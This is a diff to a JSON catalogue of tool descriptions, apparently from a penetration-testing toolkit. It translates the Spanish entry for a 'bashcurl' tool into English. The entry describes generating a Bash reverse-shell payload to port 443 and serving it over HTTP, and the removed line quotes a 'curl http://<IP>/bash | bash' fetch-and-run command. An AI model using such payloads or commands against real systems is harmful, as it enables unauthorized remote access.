@@ -62,8 +62,15 @@
     },
     "bashcurl": {
         "name": "bashcurl",
-        "short_desc": "Genera un script de reverse shell y lanza un servidor HTTP.",
-        "detailed_desc": "Este script detecta automáticamente la IP del sistema, genera un script de reverse shell en /tmp/apache/bash con conexión TCP hacia esa IP por el puerto 443, y ofrece iniciar un servidor HTTP en la misma ruta. El script está diseñado para ser descargado y ejecutado remotamente mediante curl, por ejemplo: 'curl http://<IP>/bash | bash'."
+        "short_desc": "Generates a Bash reverse-shell payload and optionally serves it over HTTP.",
+        "detailed_desc": [
+            "Detects the local IP address and prints the curl command needed to fetch the generated Bash payload.",
+            "",
+            "Prompts for the listener IP, writes a payload to /tmp/apache/bash, and sets it executable.",
+            "The generated payload opens an interactive Bash TCP connection to port 443 on the provided IP.",
+            "",
+            "After creating the payload, it can start a Python HTTP server on port 80 from /tmp/apache so the file can be downloaded with curl."
+        ]
     },
     "bajar": {
         "name": "bajar",
